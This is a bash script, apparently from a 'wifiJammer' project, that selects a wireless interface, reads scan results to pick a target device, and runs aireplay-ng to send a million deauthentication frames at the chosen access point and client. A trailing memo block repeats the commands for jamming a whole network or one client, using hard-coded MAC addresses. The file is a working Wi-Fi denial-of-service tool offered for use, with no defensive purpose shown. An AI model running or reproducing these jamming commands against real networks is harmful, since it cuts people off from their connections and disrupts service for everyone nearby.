#!/bin/bash

clear
echo "if you don't have scan networks around you, quit and do it"

com="n"
ans="n"

intSelected="none"
$networkC
allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1)
while [ $ans != "y" ]
do
	for interface in $allInterface
	do
		echo " choose the interface :"
		echo $allInterface
		echo
		echo $interface" (y/n)"
		read ans
		if [ $ans = "y" ]; then
			intSelected=$interface
		fi
		clear
	done
done

if [ $intSelected = "none" ]; then
	echo "please next time select an interface"
	exit
fi


./wifiJammer/src/monitor.sh $intSelected


i=-1
target="none"
bssid=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm1 "(?<=<BSSID>)[^<]+")
name=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-manuf>)[^<]+" | sed "s/ /_/g")


for select in $name
do
	i=$[i+1]
	clear
	echo -e "select a target :\n$name \n\n"
	echo "---"$select"---"
	read ans
	if [ $ans = "y" ]; then
		target=$select
		break
	fi

done

if [ $target != "none" ]; then
	tabM=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-mac>)[^<]+"))
	echo ${tabM[0]}"val1"
	echo ${tabM[1]}"val2"
	echo "--------------------"
	
	tabC=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<channel>)[^<]+" ))

	echo "*********************"
	
	echo "BBSID : "$bssid
	echo "Mac : "${tabM[i]}
	echo "Channel : "${tabC[$[i+1]]}
	sudo iwconfig $intSelected channel ${tabC[$[i+1]]}
	sudo aireplay-ng -0 1000000 -a $bssid $intSelected -j -c ${tabM[i]}


fi


#memo
if [ $com = "y" ]; then

#scan network
airodump-ng $intSelected
#scan during 5 seconds and write the result in test-01.csv
timeout 4 airodump-ng wlan1 -w test



#scann client
airodump-ng $intSelected --bssid 02:1A:11:FD:D5:21 -c 11
#need to be in the same channel
iwconfig $intSelected channel 11
#jamm the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j
#jamm B8 client from the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j -c B8:27:EB:A4:46:21

fi
